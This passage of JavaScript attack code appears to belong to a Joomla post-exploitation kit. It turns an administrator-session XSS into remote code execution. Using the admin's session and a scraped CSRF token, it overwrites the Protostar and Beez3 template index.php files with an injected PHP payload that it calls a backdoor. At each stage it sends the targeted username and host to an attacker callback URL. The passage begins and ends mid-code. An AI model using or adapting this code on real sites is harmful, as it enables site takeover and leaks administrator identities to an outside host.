                    "jform%5Bsource%5D=%3C%3Fphp%0D%0A%2F**%0D%0A+*+%40package+++++Joomla.Site%0D%0A+*+%40subpackage++Templates.protostar%0D%0A+*%0D%0A+*+%40copyright+++Copyright+%28C%29+2005+-+2016+Open+Source+Matters%2C+Inc.+All+rights+reserved.%0D%0A+*+%40license+++++GNU+General+Public+License+version+2+or+later%3B+see+LICENSE.txt%0D%0A+*%2F%0D%0A%0D%0Adefined%28%27_JEXEC%27%29+or+die%3B%0D%0A%0D%0A%24app+++++++++++++%3D+JFactory%3A%3AgetApplication%28%29%3B%0D%0A%24doc+++++++++++++%3D+JFactory%3A%3AgetDocument%28%29%3B%0D%0A%24user++++++++++++%3D+JFactory%3A%3AgetUser%28%29%3B%0D%0A%24this-%3Elanguage++%3D+%24doc-%3Elanguage%3B%0D%0A%24this-%3Edirection+%3D+%24doc-%3Edirection%3B%0D%0A%0D%0A%2F%2F+Output+as+HTML5%0D%0A%24doc-%3EsetHtml5%28true%29%3B%0D%0A%0D%0A%2F%2F+Getting+params+from+template%0D%0A%24params+%3D+%24app-%3EgetTemplate%28true%29-%3Eparams%3B%0D%0A%0D%0A%2F%2F+Detecting+Active+Variables%0D%0A%24option+++%3D+%24app-%3Einput-%3EgetCmd%28%27option%27%2C+%27%27%29%3B%0D%0A%24view+++++%3D+%24app-%3Einput-%3EgetCmd%28%27view%27%2C+%27%27%29%3B%0D%0A%24layout+++%3D+%24app-%3Einput-%3EgetCmd%28%27layout%27%2C+%27%27%29%3B%0D%0A%24task+++++%3D+%24app-%3Einput-%3EgetCmd%28%27task%27%2C+%27%27%29%3B%0D%0A%24itemid+++%3D+%24app-%3Einput-%3EgetCmd%28%27Itemid%27%2C+%27%27%29%3B%0D%0A%24sitename+%3D+%24app-%3Eget%28%27sitename%27%29%3B%0D%0A%0D%0Aif%28%24task+%3D%3D+%22edit%22+%7C%7C+%24layout+%3D%3D+%22form%22+%29%0D%0A%7B%0D%0A%09%24fullWidth+%3D+1%3B%0D%0A%7D%0D%0Aelse%0D%0A%7B%0D%0A%09%24fullWidth+%3D+0%3B%0D%0A%7D%0D%0A%0D%0A%2F%2F+Add+JavaScript+Frameworks%0D%0AJHtml%3A%3A_%28%27bootstrap.framework%27%29%3B%0D%0A%0D%0A%24doc-%3EaddScriptVersion%28%24this-%3Ebaseurl+.+%27%2Ftemplates%2F%27+.+%24this-%3Etemplate+.+%27%2Fjs%2Ftemplate.js%27%29%3B%0D%0A%0D%0A%2F%2F+Add+Stylesheets%0D%0A%24doc-%3EaddStyleSheetVersion%28%24this-%3Ebaseurl+.+%27%2Ftemplates%2F%27+.+%24this-%3Etemplate+.+%27%2Fcss%2Ftemplate.css%27%29%3B%0D%0A%0D%0A%2F%2F+Use+of+Google+Font%0D%0Aif+%28%24this-%3Eparams-%3Eget%28%27googleFont%27%29%29%0D%0A%7B%0D%0A%09%24doc-%3EaddStyleSheet%28%27%2F%2Ffonts.googleapis.com%2Fcss%3Ffamily%3D%27+.+%24this-%3Eparams-%3Eget%28%27googleFontName%27%29%29%3B%0D%0A%09%24doc-%3EaddStyleDeclaration%28%22%0D%0A%09h1%2C+h2%2C+h3%2C+h4%2C+h5%2C+h6%2C+.site-title+%7B%0D%0A%09%09font-family%3A+%27%22+.+str_replace%28%27%2B%27%2C+%27+%27%2C+%24this-%3Eparams-%3Eget%28%27googleFontName%27%29%29+.+%22%27%2C+sans-serif%3B%0D%0A%09%7D%22%29%3B%0D%0A%7D%0D%0A%0D%0A%2F%2F+Template+color%0D%0Aif+%28%24this-%3Eparams-%3Eget%28%27templateColor%27%29%29%0D%0A%7B%0D%0A%09%24doc-%3EaddStyleDeclaration%28%22%0D%0A%09body.site+%7B%0D%0A%09%09border-top%3A+3px+solid+%22+.+%24this-%3Eparams-%3Eget%28%27templateColor%27%29+.+%22%3B%0D%0A%09%09background-color%3A+%22+.+%24this-%3Eparams-%3Eget%28%27templateBackgroundColor%27%29+.+%22%3B%0D%0A%09%7D%0D%0A%09a+%7B%0D%0A%09%09color%3A+%22+.+%24this-%3Eparams-%3Eget%28%27templateColor%27%29+.+%22%3B%0D%0A%09%7D%0D%0A%09.nav-list+%3E+.active+%3E+a%2C%0D%0A%09.nav-list+%3E+.active+%3E+a%3Ahover%2C%0D%0A%09.dropdown-menu+li+%3E+a%3Ahover%2C%0D%0A%09.dropdown-menu+.active+%3E+a%2C%0D%0A%09.dropdown-menu+.active+%3E+a%3Ahover%2C%0D%0A%09.nav-pills+%3E+.active+%3E+a%2C%0D%0A%09.nav-pills+%3E+.active+%3E+a%3Ahover%2C%0D%0A%09.btn-primary+%7B%0D%0A%09%09background%3A+%22+.+%24this-%3Eparams-%3Eget%28%27templateColor%27%29+.+%22%3B%0D%0A%09%7D%22%29%3B%0D%0A%7D%0D%0A%0D%0A%2F%2F+Check+for+a+custom+CSS+file%0D%0A%24userCss+%3D+JPATH_SITE+.+%27%2Ftemplates%2F%27+.+%24this-%3Etemplate+.+%27%2Fcss%2Fuser.css%27%3B%0D%0A%0D%0Aif+%28file_exists%28%24userCss%29+%26%26+filesize%28%24userCss%29+%3E+0%29%0D%0A%7B%0D%0A%09%24this-%3EaddStyleSheetVersion%28%24this-%3Ebaseurl+.+%27%2Ftemplates%2F%27+.+%24this-%3Etemplate+.+%27%2Fcss%2Fuser.css%27%29%3B%0D%0A%7D%0D%0A%0D%0A" +
                    encodeURIComponent(payload) +
                    "%0D%0A%0D%0A%2F%2F+Load+optional+RTL+Bootstrap+CSS%0D%0AJHtml%3A%3A_%28%27bootstrap.loadCss%27%2C+false%2C+%24this-%3Edirection%29%3B%0D%0A%0D%0A%2F%2F+Adjusting+content+width%0D%0Aif+%28%24this-%3EcountModules%28%27position-7%27%29+%26%26+%24this-%3EcountModules%28%27position-8%27%29%29%0D%0A%7B%0D%0A%09%24span+%3D+%22span6%22%3B%0D%0A%7D%0D%0Aelseif+%28%24this-%3EcountModules%28%27position-7%27%29+%26%26+%21%24this-%3EcountModules%28%27position-8%27%29%29%0D%0A%7B%0D%0A%09%24span+%3D+%22span9%22%3B%0D%0A%7D%0D%0Aelseif+%28%21%24this-%3EcountModules%28%27position-7%27%29+%26%26+%24this-%3EcountModules%28%27position-8%27%29%29%0D%0A%7B%0D%0A%09%24span+%3D+%22span9%22%3B%0D%0A%7D%0D%0Aelse%0D%0A%7B%0D%0A%09%24span+%3D+%22span12%22%3B%0D%0A%7D%0D%0A%0D%0A%2F%2F+Logo+file+or+site+title+param%0D%0Aif+%28%24this-%3Eparams-%3Eget%28%27logoFile%27%29%29%0D%0A%7B%0D%0A%09%24logo+%3D+%27%3Cimg+src%3D%22%27+.+JUri%3A%3Aroot%28%29+.+%24this-%3Eparams-%3Eget%28%27logoFile%27%29+.+%27%22+alt%3D%22%27+.+%24sitename+.+%27%22+%2F%3E%27%3B%0D%0A%7D%0D%0Aelseif+%28%24this-%3Eparams-%3Eget%28%27sitetitle%27%29%29%0D%0A%7B%0D%0A%09%24logo+%3D+%27%3Cspan+class%3D%22site-title%22+title%3D%22%27+.+%24sitename+.+%27%22%3E%27+.+htmlspecialchars%28%24this-%3Eparams-%3Eget%28%27sitetitle%27%29%2C+ENT_COMPAT%2C+%27UTF-8%27%29+.+%27%3C%2Fspan%3E%27%3B%0D%0A%7D%0D%0Aelse%0D%0A%7B%0D%0A%09%24logo+%3D+%27%3Cspan+class%3D%22site-title%22+title%3D%22%27+.+%24sitename+.+%27%22%3E%27+.+%24sitename+.+%27%3C%2Fspan%3E%27%3B%0D%0A%7D%0D%0A%3F%3E%0D%0A%3C%21DOCTYPE+html%3E%0D%0A%3Chtml+lang%3D%22%3C%3Fphp+echo+%24this-%3Elanguage%3B+%3F%3E%22+dir%3D%22%3C%3Fphp+echo+%24this-%3Edirection%3B+%3F%3E%22%3E%0D%0A%3Chead%3E%0D%0A%09%3Cmeta+name%3D%22viewport%22+content%3D%22width%3Ddevice-width%2C+initial-scale%3D1.0%22+%2F%3E%0D%0A%09%3Cjdoc%3Ainclude+type%3D%22head%22+%2F%3E%0D%0A%09%3C%21--%5Bif+lt+IE+9%5D%3E%3Cscript+src%3D%22%3C%3Fphp+echo+JUri%3A%3Aroot%28true%29%3B+%3F%3E%2Fmedia%2Fjui%2Fjs%2Fhtml5.js%22%3E%3C%2Fscript%3E%3C%21%5Bendif%5D--%3E%0D%0A%3C%2Fhead%3E%0D%0A%3Cbody+class%3D%22site+%3C%3Fphp+echo+%24option%0D%0A%09.+%27+view-%27+.+%24view%0D%0A%09.+%28%24layout+%3F+%27+layout-%27+.+%24layout+%3A+%27+no-layout%27%29%0D%0A%09.+%28%24task+%3F+%27+task-%27+.+%24task+%3A+%27+no-task%27%29%0D%0A%09.+%28%24itemid+%3F+%27+itemid-%27+.+%24itemid+%3A+%27%27%29%0D%0A%09.+%28%24params-%3Eget%28%27fluidContainer%27%29+%3F+%27+fluid%27+%3A+%27%27%29%3B%0D%0A%09echo+%28%24this-%3Edirection+%3D%3D+%27rtl%27+%3F+%27+rtl%27+%3A+%27%27%29%3B%0D%0A%3F%3E%22%3E%0D%0A%09%3C%21--+Body+--%3E%0D%0A%09%3Cdiv+class%3D%22body%22%3E%0D%0A%09%09%3Cdiv+class%3D%22container%3C%3Fphp+echo+%28%24params-%3Eget%28%27fluidContainer%27%29+%3F+%27-fluid%27+%3A+%27%27%29%3B+%3F%3E%22%3E%0D%0A%09%09%09%3C%21--+Header+--%3E%0D%0A%09%09%09%3Cheader+class%3D%22header%22+role%3D%22banner%22%3E%0D%0A%09%09%09%09%3Cdiv+class%3D%22header-inner+clearfix%22%3E%0D%0A%09%09%09%09%09%3Ca+class%3D%22brand+pull-left%22+href%3D%22%3C%3Fphp+echo+%24this-%3Ebaseurl%3B+%3F%3E%2F%22%3E%0D%0A%09%09%09%09%09%09%3C%3Fphp+echo+%24logo%3B+%3F%3E%0D%0A%09%09%09%09%09%09%3C%3Fphp+if+%28%24this-%3Eparams-%3Eget%28%27sitedescription%27%29%29+%3A+%3F%3E%0D%0A%09%09%09%09%09%09%09%3C%3Fphp+echo+%27%3Cdiv+class%3D%22site-description%22%3E%27+.+htmlspecialchars%28%24this-%3Eparams-%3Eget%28%27sitedescription%27%29%2C+ENT_COMPAT%2C+%27UTF-8%27%29+.+%27%3C%2Fdiv%3E%27%3B+%3F%3E%0D%0A%09%09%09%09%09%09%3C%3Fphp+endif%3B+%3F%3E%0D%0A%09%09%09%09%09%3C%2Fa%3E%0D%0A%09%09%09%09%09%3Cdiv+class%3D%22header-search+pull-right%22%3E%0D%0A%09%09%09%09%09%09%3Cjdoc%3Ainclude+type%3D%22modules%22+name%3D%22position-0%22+style%3D%22none%22+%2F%3E%0D%0A%09%09%09%09%09%3C%2Fdiv%3E%0D%0A%09%09%09%09%3C%2Fdiv%3E%0D%0A%09%09%09%3C%2Fheader%3E%0D%0A%09%09%09%3C%3Fphp+if+%28%24this-%3EcountModules%28%27position-1%27%29%29+%3A+%3F%3E%0D%0A%09%09%09%09%3Cnav+class%3D%22navigation%22+role%3D%22navigation%22%3E%0D%0A%09%09%09%09%09%3Cdiv+class%3D%22navbar+pull-left%22%3E%0D%0A%09%09%09%09%09%09%3Ca+class%3D%22btn+btn-navbar+collapsed%22+data-toggle%3D%22collapse%22+data-target%3D%22.nav-collapse%22%3E%0D%0A%09%09%09%09%09%09%09%3Cspan+class%3D%22icon-bar%22%3E%3C%2Fspan%3E%0D%0A%09%09%09%09%09%09%09%3Cspan+class%3D%22icon-bar%22%3E%3C%2Fspan%3E%0D%0A%09%09%09%09%09%09%09%3Cspan+class%3D%22icon-bar%22%3E%3C%2Fspan%3E%0D%0A%09%09%09%09%09%09%3C%2Fa%3E%0D%0A%09%09%09%09%09%3C%2Fdiv%3E%0D%0A%09%09%09%09%09%3Cdiv+class%3D%22nav-collapse%22%3E%0D%0A%09%09%09%09%09%09%3Cjdoc%3Ainclude+type%3D%22modules%22+name%3D%22position-1%22+style%3D%22none%22+%2F%3E%0D%0A%09%09%09%09%09%3C%2Fdiv%3E%0D%0A%09%09%09%09%3C%2Fnav%3E%0D%0A%09%09%09%3C%3Fphp+endif%3B+%3F%3E%0D%0A%09%09%09%3Cjdoc%3Ainclude+type%3D%22modules%22+name%3D%22banner%22+style%3D%22xhtml%22+%2F%3E%0D%0A%09%09%09%3Cdiv+class%3D%22row-fluid%22%3E%0D%0A%09%09%09%09%3C%3Fphp+if+%28%24this-%3EcountModules%28%27position-8%27%29%29+%3A+%3F%3E%0D%0A%09%09%09%09%09%3C%21--+Begin+Sidebar+--%3E%0D%0A%09%09%09%09%09%3Cdiv+id%3D%22sidebar%22+class%3D%22span3%22%3E%0D%0A%09%09%09%09%09%09%3Cdiv+class%3D%22sidebar-nav%22%3E%0D%0A%09%09%09%09%09%09%09%3Cjdoc%3Ainclude+type%3D%22modules%22+name%3D%22position-8%22+style%3D%22xhtml%22+%2F%3E%0D%0A%09%09%09%09%09%09%3C%2Fdiv%3E%0D%0A%09%09%09%09%09%3C%2Fdiv%3E%0D%0A%09%09%09%09%09%3C%21--+End+Sidebar+--%3E%0D%0A%09%09%09%09%3C%3Fphp+endif%3B+%3F%3E%0D%0A%09%09%09%09%3Cmain+id%3D%22content%22+role%3D%22main%22+class%3D%22%3C%3Fphp+echo+%24span%3B+%3F%3E%22%3E%0D%0A%09%09%09%09%09%3C%21--+Begin+Content+--%3E%0D%0A%09%09%09%09%09%3Cjdoc%3Ainclude+type%3D%22modules%22+name%3D%22position-3%22+style%3D%22xhtml%22+%2F%3E%0D%0A%09%09%09%09%09%3Cjdoc%3Ainclude+type%3D%22message%22+%2F%3E%0D%0A%09%09%09%09%09%3Cjdoc%3Ainclude+type%3D%22component%22+%2F%3E%0D%0A%09%09%09%09%09%3Cjdoc%3Ainclude+type%3D%22modules%22+name%3D%22position-2%22+style%3D%22none%22+%2F%3E%0D%0A%09%09%09%09%09%3C%21--+End+Content+--%3E%0D%0A%09%09%09%09%3C%2Fmain%3E%0D%0A%09%09%09%09%3C%3Fphp+if+%28%24this-%3EcountModules%28%27position-7%27%29%29+%3A+%3F%3E%0D%0A%09%09%09%09%09%3Cdiv+id%3D%22aside%22+class%3D%22span3%22%3E%0D%0A%09%09%09%09%09%09%3C%21--+Begin+Right+Sidebar+--%3E%0D%0A%09%09%09%09%09%09%3Cjdoc%3Ainclude+type%3D%22modules%22+name%3D%22position-7%22+style%3D%22well%22+%2F%3E%0D%0A%09%09%09%09%09%09%3C%21--+End+Right+Sidebar+--%3E%0D%0A%09%09%09%09%09%3C%2Fdiv%3E%0D%0A%09%09%09%09%3C%3Fphp+endif%3B+%3F%3E%0D%0A%09%09%09%3C%2Fdiv%3E%0D%0A%09%09%3C%2Fdiv%3E%0D%0A%09%3C%2Fdiv%3E%0D%0A%09%3C%21--+Footer+--%3E%0D%0A%09%3Cfooter+class%3D%22footer%22+role%3D%22contentinfo%22%3E%0D%0A%09%09%3Cdiv+class%3D%22container%3C%3Fphp+echo+%28%24params-%3Eget%28%27fluidContainer%27%29+%3F+%27-fluid%27+%3A+%27%27%29%3B+%3F%3E%22%3E%0D%0A%09%09%09%3Chr+%2F%3E%0D%0A%09%09%09%3Cjdoc%3Ainclude+type%3D%22modules%22+name%3D%22footer%22+style%3D%22none%22+%2F%3E%0D%0A%09%09%09%3Cp+class%3D%22pull-right%22%3E%0D%0A%09%09%09%09%3Ca+href%3D%22%23top%22+id%3D%22back-top%22%3E%0D%0A%09%09%09%09%09%3C%3Fphp+echo+JText%3A%3A_%28%27TPL_PROTOSTAR_BACKTOTOP%27%29%3B+%3F%3E%0D%0A%09%09%09%09%3C%2Fa%3E%0D%0A%09%09%09%3C%2Fp%3E%0D%0A%09%09%09%3Cp%3E%0D%0A%09%09%09%09%26copy%3B+%3C%3Fphp+echo+date%28%27Y%27%29%3B+%3F%3E+%3C%3Fphp+echo+%24sitename%3B+%3F%3E%0D%0A%09%09%09%3C%2Fp%3E%0D%0A%09%09%3C%2Fdiv%3E%0D%0A%09%3C%2Ffooter%3E%0D%0A%09%3Cjdoc%3Ainclude+type%3D%22modules%22+name%3D%22debug%22+style%3D%22none%22+%2F%3E%0D%0A%3C%2Fbody%3E%0D%0A%3C%2Fhtml%3E%0D%0A" +
                    "&task=template.save&" +
                    csrf_token + "=1&jform%5Bextension_id%5D=" +
                    ID + "&jform%5Bfilename%5D=%2Findex.php"

                );

                // Check if the file was edited successfully
                if (_stage2.responseText.match("File successfully saved.")) {

                    if (Callback) {
                        var _callback = new XMLHttpRequest();
                        _callback.open("POST", Callback, true);
                        _callback.send(
                            JSON.stringify(
                                {
                                    "Host": Target + templateURI,
                                    "Message": "(Stage 2) - (Protostar) Template Edited Sucessfuly! <file: index.php>",
                                    "Module": "JLEditTemplates.Protostar()",
                                    "About": "You can trigger your backdoor in any application file/endpoint",
                                    "Targeted User": _usr,
                                    "Date": new Date().toUTCString()
                                }
                            )
                        );
                    }

                } else {

                    if (Callback) {
                        var _callback = new XMLHttpRequest();
                        _callback.open("POST", Callback, true);
                        _callback.send(
                            JSON.stringify(
                                {
                                    "Host": Target + templateURI,
                                    "Message": "ERROR: (Stage 2) - Cannot Edit (Protostar) Template",
                                    "Module": "JLEditTemplates.Protostar()",
                                    "About": "The user doesn't have (Super Users) Permission",
                                    "Targeted User": _usr,
                                    "Date": new Date().toUTCString()
                                }
                            )
                        );
                    }

                }

            }

        } else {

            if (Callback) {
                var _callback = new XMLHttpRequest();
                _callback.open("POST", Callback, true);
                _callback.send(
                    JSON.stringify(
                        {
                            "Host": Target + "administrator/index.php?option=com_templates&view=templates&client_id=0",
                            "Module": "JLEditTemplates.Protostar()",
                            "Message": "ERROR: Stage 1 - (Cannot Get Server Response!)",
                            "Date": new Date().toUTCString()
                        }
                    )
                );
            }
        }

    }

    // Joomla 3.x.x Site Template: (Beez3)
    function Beez3() {

        if (Target.substr(-1) != '/') Target += '/';
        var _stage1 = new XMLHttpRequest();
        _stage1.open("GET", Target + "administrator/index.php?option=com_templates&view=templates", false);
        _stage1.send();

        if (_stage1.responseText) {

            if (_stage1.responseText.match("Joomla Administrator Login")) {
                if (Callback) {
                    var _callback = new XMLHttpRequest();
                    _callback.open("POST", Callback, true);
                    _callback.send(
                        JSON.stringify(
                            {
                                "Host": Target + "administrator/index.php?option=com_templates&view=templates",
                                "Module": "JLEditTemplates.Beez3()",
                                "Message": "ERROR: Stage 1 - (The user affected by XSS lacks access to the Admin Panel)",
                                "Date": new Date().toUTCString()
                            }
                        )
                    );
                }

            } else {

                // Identify the user who triggered the XSS
                var _usr = new XMLHttpRequest();
                _usr.open("GET", Target + "administrator/index.php?option=com_admin&view=profile&layout=edit", false);
                _usr.send();
                _usr = _usr.responseText.match(/<input[^>]*\sname=['"]jform\[username]['"][^>]*\svalue=['"]([^'"]*)['"][^>]*>/)[1];

                // Extract csrf_token
                var csrf_token = _stage1.responseText.match(/&amp;([a-zA-Z0-9_-]+)=1/)[1];

                // Extract (Beez3) Template URI
                var templateURI = _stage1.responseText.match(/<a[^>]*\s*href\s*=\s*["']([^"']*)["'][^>]*>(?:\s*Beez3 Details and Files\s*)?<\/a>/i)[1];
                templateURI = templateURI.replace(/&amp;/g, '&');
                templateURI = templateURI.replace(/(\?|&)file=([^&]*)/, `$1file=L2luZGV4LnBocA`);
                templateURI = templateURI.substring(1);

                // Get the ID of the Template URI
                var ID = templateURI.match(/[?&]id=([^&]+)/)[1];

                // Edit index.php file
                var _stage2 = new XMLHttpRequest();
                _stage2.open("POST", Target + templateURI, false);
                _stage2.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
                _stage2.send(
                    "jform%5Bsource%5D=%3C%3Fphp%0D%0A%2F**%0D%0A+*+%40package+++++Joomla.Site%0D%0A+*+%40subpackage++Templates.beez3%0D%0A+*+%0D%0A+*+%40copyright+++Copyright+%28C%29+2005+-+2016+Open+Source+Matters%2C+Inc.+All+rights+reserved.%0D%0A+*+%40license+++++GNU+General+Public+License+version+2+or+later%3B+see+LICENSE.txt%0D%0A+*%2F%0D%0A%0D%0A%2F%2F+No+direct+access.%0D%0Adefined%28%27_JEXEC%27%29+or+die%3B%0D%0A%0D%0AJLoader%3A%3Aimport%28%27joomla.filesystem.file%27%29%3B%0D%0A%0D%0A%2F%2F+Check+modules%0D%0A%24showRightColumn+%3D+%28%24this-%3EcountModules%28%27position-3%27%29+or+%24this-%3EcountModules%28%27position-6%27%29+or+%24this-%3EcountModules%28%27position-8%27%29%29%3B%0D%0A%24showbottom++++++%3D+%28%24this-%3EcountModules%28%27position-9%27%29+or+%24this-%3EcountModules%28%27position-10%27%29+or+%24this-%3EcountModules%28%27position-11%27%29%29%3B%0D%0A%24showleft++++++++%3D+%28%24this-%3EcountModules%28%27position-4%27%29+or+%24this-%3EcountModules%28%27position-7%27%29+or+%24this-%3EcountModules%28%27position-5%27%29%29%3B%0D%0A%0D%0Aif+%28%24showRightColumn+%3D%3D+0+and+%24showleft+%3D%3D+0%29%0D%0A%7B%0D%0A%09%24showno+%3D+0%3B%0D%0A%7D%0D%0A%0D%0AJHtml%3A%3A_%28%27behavior.framework%27%2C+true%29%3B%0D%0A%0D%0A%2F%2F+Get+params%0D%0A%24color++++++++++%3D+%24this-%3Eparams-%3Eget%28%27templatecolor%27%29%3B%0D%0A%24logo+++++++++++%3D+%24this-%3Eparams-%3Eget%28%27logo%27%29%3B%0D%0A%24navposition++++%3D+%24this-%3Eparams-%3Eget%28%27navposition%27%29%3B%0D%0A%24headerImage++++%3D+%24this-%3Eparams-%3Eget%28%27headerImage%27%29%3B%0D%0A%24app++++++++++++%3D+JFactory%3A%3AgetApplication%28%29%3B%0D%0A%24templateparams+%3D+%24app-%3EgetTemplate%28true%29-%3Eparams%3B%0D%0A%24config+++++++++%3D+JFactory%3A%3AgetConfig%28%29%3B%0D%0A%24bootstrap++++++%3D+explode%28%27%2C%27%2C+%24templateparams-%3Eget%28%27bootstrap%27%29%29%3B%0D%0A%24jinput+++++++++%3D+JFactory%3A%3AgetApplication%28%29-%3Einput%3B%0D%0A%24option+++++++++%3D+%24jinput-%3Eget%28%27option%27%2C+%27%27%2C+%27cmd%27%29%3B%0D%0A%0D%0A%2F%2F+Output+as+HTML5%0D%0A%24this-%3EsetHtml5%28true%29%3B%0D%0A%0D%0Aif+%28in_array%28%24option%2C+%24bootstrap%29%29%0D%0A%7B%0D%0A%09%2F%2F+Load+optional+rtl+Bootstrap+css+and+Bootstrap+bugfixes%0D%0A%09JHtml%3A%3A_%28%27bootstrap.loadCss%27%2C+true%2C+%24this-%3Edirection%29%3B%0D%0A%7D%0D%0A%0D%0A%24this-%3EaddStyleSheet%28%24this-%3Ebaseurl+.+%27%2Ftemplates%2Fsystem%2Fcss%2Fsystem.css%27%29%3B%0D%0A%24this-%3EaddStyleSheet%28%24this-%3Ebaseurl+.+%27%2Ftemplates%2F%27+.+%24this-%3Etemplate+.+%27%2Fcss%2Fposition.css%27%2C+%27text%2Fcss%27%2C+%27screen%27%29%3B%0D%0A%24this-%3EaddStyleSheet%28%24this-%3Ebaseurl+.+%27%2Ftemplates%2F%27+.+%24this-%3Etemplate+.+%27%2Fcss%2Flayout.css%27%2C+%27text%2Fcss%27%2C+%27screen%27%29%3B%0D%0A%24this-%3EaddStyleSheet%28%24this-%3Ebaseurl+.+%27%2Ftemplates%2F%27+.+%24this-%3Etemplate+.+%27%2Fcss%2Fprint.css%27%2C+%27text%2Fcss%27%2C+%27print%27%29%3B%0D%0A%24this-%3EaddStyleSheet%28%24this-%3Ebaseurl+.+%27%2Ftemplates%2F%27+.+%24this-%3Etemplate+.+%27%2Fcss%2Fgeneral.css%27%2C+%27text%2Fcss%27%2C+%27screen%27%29%3B%0D%0A%24this-%3EaddStyleSheet%28%24this-%3Ebaseurl+.+%27%2Ftemplates%2F%27+.+%24this-%3Etemplate+.+%27%2Fcss%2F%27+.+htmlspecialchars%28%24color%2C+ENT_COMPAT%2C+%27UTF-8%27%29+.+%27.css%27%2C+%27text%2Fcss%27%2C+%27screen%27%29%3B%0D%0A%0D%0Aif+%28%24this-%3Edirection+%3D%3D+%27rtl%27%29%0D%0A%7B%0D%0A%09%24this-%3EaddStyleSheet%28%24this-%3Ebaseurl+.+%27%2Ftemplates%2F%27+.+%24this-%3Etemplate+.+%27%2Fcss%2Ftemplate_rtl.css%27%29%3B%0D%0A%09if+%28file_exists%28JPATH_SITE+.+%27%2Ftemplates%2F%27+.+%24this-%3Etemplate+.+%27%2Fcss%2F%27+.+htmlspecialchars%28%24color%2C+ENT_COMPAT%2C+%27UTF-8%27%29+.+%27_rtl.css%27%29%29%0D%0A%09%7B%0D%0A%09%09%24this-%3EaddStyleSheet%28%24this-%3Ebaseurl+.+%27%2Ftemplates%2F%27+.+%24this-%3Etemplate+.+%27%2Fcss%2F%27+.+htmlspecialchars%28%24color%2C+ENT_COMPAT%2C+%27UTF-8%27%29+.+%27_rtl.css%27%29%3B%0D%0A%09%7D%0D%0A%7D%0D%0A%0D%0Aif+%28%24color+%3D%3D+%27image%27%29%0D%0A%7B%0D%0A%09%24this-%3EaddStyleDeclaration%28%22%0D%0A%09.logoheader+%7B%0D%0A%09%09background%3A+url%28%27%22+.+%24this-%3Ebaseurl+.+%22%2F%22+.+htmlspecialchars%28%24headerImage%29+.+%22%27%29+no-repeat+right%3B%0D%0A%09%7D%0D%0A%09body+%7B%0D%0A%09%09background%3A+%22+.+%24templateparams-%3Eget%28%27backgroundcolor%27%29+.+%22%3B%0D%0A%09%7D%22%29%3B%0D%0A%7D%0D%0A%0D%0A%2F%2F+Check+for+a+custom+CSS+file%0D%0A%24userCss+%3D+JPATH_SITE+.+%27%2Ftemplates%2F%27+.+%24this-%3Etemplate+.+%27%2Fcss%2Fuser.css%27%3B%0D%0A%0D%0A" +
                    encodeURIComponent(payload) +
                    "%0D%0A%0D%0Aif+%28file_exists%28%24userCss%29+%26%26+filesize%28%24userCss%29+%3E+0%29%0D%0A%7B%0D%0A%09%24this-%3EaddStyleSheetVersion%28%24this-%3Ebaseurl+.+%27%2Ftemplates%2F%27+.+%24this-%3Etemplate+.+%27%2Fcss%2Fuser.css%27%29%3B%0D%0A%7D%0D%0A%0D%0AJHtml%3A%3A_%28%27bootstrap.framework%27%29%3B%0D%0A%24this-%3EaddScript%28%24this-%3Ebaseurl+.+%27%2Ftemplates%2F%27+.+%24this-%3Etemplate+.+%27%2Fjavascript%2Fmd_stylechanger.js%27%29%3B%0D%0A%24this-%3EaddScript%28%24this-%3Ebaseurl+.+%27%2Ftemplates%2F%27+.+%24this-%3Etemplate+.+%27%2Fjavascript%2Fhide.js%27%29%3B%0D%0A%24this-%3EaddScript%28%24this-%3Ebaseurl+.+%27%2Ftemplates%2F%27+.+%24this-%3Etemplate+.+%27%2Fjavascript%2Frespond.src.js%27%29%3B%0D%0A%24this-%3EaddScript%28%24this-%3Ebaseurl+.+%27%2Ftemplates%2F%27+.+%24this-%3Etemplate+.+%27%2Fjavascript%2Ftemplate.js%27%29%3B%0D%0A%0D%0Arequire+__DIR__+.+%27%2Fjsstrings.php%27%3B%0D%0A%3F%3E%0D%0A%3C%21DOCTYPE+html%3E%0D%0A%3Chtml+lang%3D%22%3C%3Fphp+echo+%24this-%3Elanguage%3B+%3F%3E%22+dir%3D%22%3C%3Fphp+echo+%24this-%3Edirection%3B+%3F%3E%22%3E%0D%0A%09%3Chead%3E%0D%0A%09%09%3Cmeta+name%3D%22viewport%22+content%3D%22width%3Ddevice-width%2C+initial-scale%3D1.0%2C+maximum-scale%3D3.0%2C+user-scalable%3Dyes%22%2F%3E%0D%0A%09%09%3Cmeta+name%3D%22HandheldFriendly%22+content%3D%22true%22+%2F%3E%0D%0A%09%09%3Cmeta+name%3D%22apple-mobile-web-app-capable%22+content%3D%22YES%22+%2F%3E%0D%0A%09%09%3Cjdoc%3Ainclude+type%3D%22head%22+%2F%3E%0D%0A%09%09%3C%21--%5Bif+IE+7%5D%3E%3Clink+href%3D%22%3C%3Fphp+echo+%24this-%3Ebaseurl%3B+%3F%3E%2Ftemplates%2F%3C%3Fphp+echo+%24this-%3Etemplate%3B+%3F%3E%2Fcss%2Fie7only.css%22+rel%3D%22stylesheet%22+%2F%3E%3C%21%5Bendif%5D--%3E%0D%0A%09%09%3C%21--%5Bif+lt+IE+9%5D%3E%3Cscript+src%3D%22%3C%3Fphp+echo+JUri%3A%3Aroot%28true%29%3B+%3F%3E%2Fmedia%2Fjui%2Fjs%2Fhtml5.js%22%3E%3C%2Fscript%3E%3C%21%5Bendif%5D--%3E%0D%0A%09%3C%2Fhead%3E%0D%0A%09%3Cbody+id%3D%22shadow%22%3E%0D%0A%09%09%3Cdiv+id%3D%22all%22%3E%0D%0A%09%09%09%3Cdiv+id%3D%22back%22%3E%0D%0A%09%09%09%09%3Cheader+id%3D%22header%22%3E%0D%0A%09%09%09%09%09%3Cdiv+class%3D%22logoheader%22%3E%0D%0A%09%09%09%09%09%09%3Ch1+id%3D%22logo%22%3E%0D%0A%09%09%09%09%09%09%3C%3Fphp+if+%28%24logo%29+%3A+%3F%3E%0D%0A%09%09%09%09%09%09%09%3Cimg+src%3D%22%3C%3Fphp+echo+%24this-%3Ebaseurl%3B+%3F%3E%2F%3C%3Fphp+echo+htmlspecialchars%28%24logo%29%3B+%3F%3E%22++alt%3D%22%3C%3Fphp+echo+htmlspecialchars%28%24templateparams-%3Eget%28%27sitetitle%27%29%29%3B+%3F%3E%22+%2F%3E%0D%0A%09%09%09%09%09%09%3C%3Fphp+endif%3B%3F%3E%0D%0A%09%09%09%09%09%09%3C%3Fphp+if+%28%21%24logo+AND+%24templateparams-%3Eget%28%27sitetitle%27%29%29+%3A+%3F%3E%0D%0A%09%09%0